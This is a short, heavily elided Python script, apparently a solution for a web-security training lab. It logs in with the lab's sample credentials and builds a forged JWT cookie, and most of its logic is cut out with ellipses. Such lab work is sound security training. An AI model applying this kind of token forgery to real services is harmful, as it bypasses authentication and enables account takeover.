...
SERVER = "https://0a770087046421a684bde18100b900f8.web-security-academy.net"
...
def main():
    ...
    with console.status("Logging in"):
        res = do_login("wiener", "peter")
        console.log(f"Login status: {res}")
    ...
    with console.status("Building forged JWT cookie"):
        ...
        console.log(f"[magenta]Decoded JWT headers[/magenta]: {original_headers}")
        console.log(f"[magenta]Decoded JWT payload[/magenta]: {original_payload}")
        ...
        console.log(f"[magenta]Tampered JWT cookie[/magenta]: {forged_headers, forged_payload}")
